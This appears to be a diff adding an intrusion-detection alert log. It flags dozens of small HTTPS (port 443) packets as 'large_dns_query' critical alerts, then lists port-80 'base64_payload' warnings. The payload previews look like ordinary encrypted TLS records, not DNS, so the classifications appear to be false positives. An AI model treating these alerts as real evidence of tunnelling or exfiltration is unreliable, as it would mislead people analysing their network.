+[BASE64] FwMDACLxh5jO9JOEIaP6TDB8PfSujcSTTj0pZugVbvFXqPxJusaT...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:18:10.777500
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 34.120.208.123:443
+  Destination: 10.18.156.186:50510
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACIZRCnPWQgtsFyKUmTmL8khAw9ddActcrjVAE8uuq3NEmzY...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:18:11.607802
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 10.18.156.186:50510
+  Destination: 34.120.208.123:443
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACLSnBEigpacvhvB2lCl1jDsqJsAzHmDmhHotlcUI3WhFd2T...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:18:13.596211
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 34.149.117.202:443
+  Destination: 10.18.156.186:46540
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACKDWLAC3gRd0nxzw4jJiJn4df6kbNZaGRafGCRr7wMYvhTA...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:18:13.661227
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 34.149.117.202:443
+  Destination: 10.18.156.186:46540
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACKDWLAC3gRd0nxzw4jJiJn4df6kbNZaGRafGCRr7wMYvhTA...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:18:13.682636
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 10.18.156.186:46540
+  Destination: 34.149.117.202:443
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACJvUeRmeSure1WsC3mqkvN5oeJcpDIEhGeotQhI32IhiWvJ...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:18:15.570511
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 10.18.156.186:50510
+  Destination: 34.120.208.123:443
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACIbyxbFPlNEntegOlPWj4ZQqEh3jQ7ihNuQhFdUf2zrAJrG...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:18:15.821353
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 34.120.208.123:443
+  Destination: 10.18.156.186:50510
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACJ2XIPctONZpjjXzSPBGx4OBMEJOzNN67yNv2C1fyYwOLCQ...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:18:16.322610
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 10.18.156.186:50510
+  Destination: 34.120.208.123:443
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACINk3DxC37TxdBgDVhFyHeCuR2SgLosx07KvMCxmRZUih9z...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:18:16.617542
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 10.18.156.186:50510
+  Destination: 34.120.208.123:443
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACLCddw6qKdPGAdYypDTX0DcSDj2KPnnC5bUy20pMrOjbZSs...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:18:33.935355
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 10.18.156.186:49474
+  Destination: 35.190.72.216:443
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACLneu71YjLoiTvS5QBZ2chIaCgSgkyvCBf3rCJpigq7L0TF...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:18:34.064705
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 35.190.72.216:443
+  Destination: 10.18.156.186:49474
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACJuBXkvIijinIEIHFtrZ2UCigpvwrwr34qoOZwNFdL5v1RY...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:19:05.664732
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 34.120.208.123:443
+  Destination: 10.18.156.186:50510
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACIO8h8HhGBlMIHldrnk4eFz3vynHSwaQRnnrq0bz1ndfKEN...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:19:06.070891
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 10.18.156.186:49788
+  Destination: 199.232.81.91:443
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACJBb2cVoQQRpZYKaqSvfpcof9NUH8rl8uTQfglLkhDm0aRa...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:19:32.922304
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 10.18.156.186:49474
+  Destination: 35.190.72.216:443
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACI6sYHgvfLQV7msizpLHTe7Ju8VULgQiUNLkTXlGrgVh4vW...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:19:33.067233
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 34.49.51.44:443
+  Destination: 10.18.156.186:41262
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACKz1TGy1YIcuHnvgDZEmrNzJZwpyZM34lcTPk7YovErnPkF...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:19:34.024446
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 35.190.72.216:443
+  Destination: 10.18.156.186:49480
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACJz1pPxQGD75RZmbzMslrcFFILaNlCLOb43pzdg7cg2sICA...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:41:51.982700
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 35.190.72.216:443
+  Destination: 10.18.156.186:33050
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACJAOelZ9tjFX9oWzpvySYV77aIMCONL98wD51d1otIVgDgX...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:41:59.010271
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 10.18.156.186:49008
+  Destination: 151.101.243.19:443
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACJXO2k48IDhD8w5YFYn7as9t5hmGwxDwpoV2ctaQ8qyR2EJ...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:42:49.457264
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 34.36.137.203:443
+  Destination: 10.18.156.186:38844
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACLbpFMKpYeCv0mFg2iHO1DXkmHaoMt1u6rTb7inh5v2Unao...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:42:59.879431
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 10.18.156.186:58392
+  Destination: 34.160.144.191:443
+  Protocol: TCP
+  Payload Size: 42 bytes
+
+Payload Preview:
+[BASE64] FwMDACUAAAAAAAAACcu1bciEGXUs5U8o547aE6bCQgnW4DKiz9mwISlL...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:43:43.075977
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 10.18.156.186:40956
+  Destination: 34.107.243.93:443
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACKpBhlaRYP929FrdHpjFwcYBhefmq9rhIGq5lmy2COmXqRg...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:43:44.097548
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 10.18.156.186:33050
+  Destination: 35.190.72.216:443
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACJzyClSBiGdyTPyld3VFBAhlkt5F1aRs2FCWB3HZwORNsOu...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:47:43.638053
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 142.250.181.170:443
+  Destination: 10.18.156.186:38660
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACJHxrKFANsMagUbvdFCGtHCCCL8vyuUmXt6ott5eXSQdYUi...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:47:43.685805
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 142.250.181.170:443
+  Destination: 10.18.156.186:38660
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACJHxrKFANsMagUbvdFCGtHCCCL8vyuUmXt6ott5eXSQdYUi...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:47:49.183623
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 10.18.156.186:59418
+  Destination: 34.36.137.203:443
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACKb4EqQtUVFf4zUjnlEHmusLLYxeFmMd529MtKet51dv5F8...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:47:49.324652
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 34.36.137.203:443
+  Destination: 10.18.156.186:59418
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACLRiXnCTm9PP5zXu7ndb9C26kAKBreJ2b7qCDmqW2w8amsN...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-28 16:44:16.816295
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 142.250.180.138:443
+  Destination: 192.168.1.20:53800
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACJZRKULvrrjGO44QAEZ1cFPyXSepGO0w7k6H2qih8gQGebr...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-28 16:49:34.718762
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 192.168.1.20:36852
+  Destination: 199.232.81.91:443
+  Protocol: TCP
+  Payload Size: 99 bytes
+
+Payload Preview:
+[BASE64] FwMDAF4AAAAAAAAAAUEk01VpQFyGwZO706u+WHAz20eStI0yn8amwI8TUyBfgEjlJER22rAWDFsxyrBqnN7JEjX4bqeQkRDLYocSO6RtEZQcgllyl3zhhCoQDiizUPltN8IL...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-28 16:49:34.778169
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 199.232.81.91:443
+  Destination: 192.168.1.20:36852
+  Protocol: TCP
+  Payload Size: 72 bytes
+
+Payload Preview:
+[BASE64] FwMDAEMAAAAAAAAAAXMh6164tbnR7mWL538jS3l5QA6F2dIpeq6mb75yFuGZ7iyGobOvzWVNB7s3QIiAaYK1JnA28QZlFWA7...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-28 16:49:48.947653
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 34.107.243.93:443
+  Destination: 192.168.61.129:58814
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACIuOfZeVzPGWuDwAFTVDQaopGUY4UtmLzCnlNiDJX6nFK6V...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-28 16:49:49.084165
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 192.168.61.129:55726
+  Destination: 151.101.1.91:443
+  Protocol: TCP
+  Payload Size: 99 bytes
+
+Payload Preview:
+[BASE64] FwMDAF4AAAAAAAAAAepUpAbcPVOSrsFWfyNhCF6kMYjsnDcqEzcC5w/6GGmSS2zOKZDd/OQThzTC12YLWznmGMIXGpQMLam1kinGcS4jcv3F8IjeB2GvAz0SIcu5A6u3uJKC...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-28 16:53:10.358023
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 151.101.1.91:443
+  Destination: 192.168.61.129:34716
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACKqd5xcXVyHT4LNcEPHSOOCFgd71f0JTE8kF5HSXr6oazZV...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-28 16:54:03.670722
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 34.107.243.93:443
+  Destination: 192.168.61.129:50600
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACKszNUSAqOanvQoUbHauu1CotO5yAlw2s8TAhGzgsIwUBgG...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-28 16:54:08.004242
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 34.149.117.202:443
+  Destination: 192.168.61.129:42646
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACKkehHdyJXMizScnFR4gFLmhQRSySdUuuyf4X2oxMzgDcCK...
+==================================================
+
+[2025-12-28 17:24:48.113949] WARNING | 49.13.65.235:80 -> 10.2.21.101:64066 | Score: 5 | base64_payload
+[2025-12-28 17:24:49.271366] WARNING | 167.71.107.109:80 -> 10.2.21.101:64067 | Score: 5 | base64_payload
+[2025-12-28 17:24:49.273168] WARNING | 167.71.107.109:80 -> 10.2.21.101:64067 | Score: 5 | base64_payload
+[2025-12-28 17:24:49.274841] WARNING | 167.71.107.109:80 -> 10.2.21.101:64067 | Score: 5 | base64_payload
+[2025-12-28 17:24:49.275519] WARNING | 167.71.107.109:80 -> 10.2.21.101:64067 | Score: 5 | base64_payload
+[2025-12-28 17:24:49.276361] WARNING | 167.71.107.109:80 -> 10.2.21.101:64067 | Score: 5 | base64_payload
+[2025-12-28 17:24:49.276995] WARNING | 167.71.107.109:80 -> 10.2.21.101:64067 | Score: 5 | base64_payload
+[2025-12-28 17:24:49.339877] WARNING | 167.71.107.109:80 -> 10.2.21.101:64067 | Score: 5 | base64_payload
+[2025-12-28 17:24:49.350063] WARNING | 167.71.107.109:80 -> 10.2.21.101:64067 | Score: 5 | base64_payload
+[2025-12-28 17:24:49.351089] WARNING | 167.71.107.109:80 -> 10.2.21.101:64067 | Score: 5 | base64_payload
+[2025-12-28 17:24:49.352071] WARNING | 167.71.107.109:80 -> 10.2.21.101:64067 | Score: 5 | base64_payload
+[2025-12-28 17:24:49.353049] WARNING | 167.71.107.109:80 -> 10.2.21.101:64067 | Score: 5 | base64_payload
+[2025-12-28 17:24:49.354276] WARNING | 167.71.107.109:80 -> 10.2.21.101:64067 | Score: 5 | base64_payload
+[2025-12-28 17:30:02.647251] WARNING | 142.251.116.99:80 -> 10.2.21.101:64079 | Score: 5 | base64_payload
+[2025-12-28 17:30:02.649560] WARNING | 142.251.116.99:80 -> 10.2.21.101:64079 | Score: 5 | base64_payload
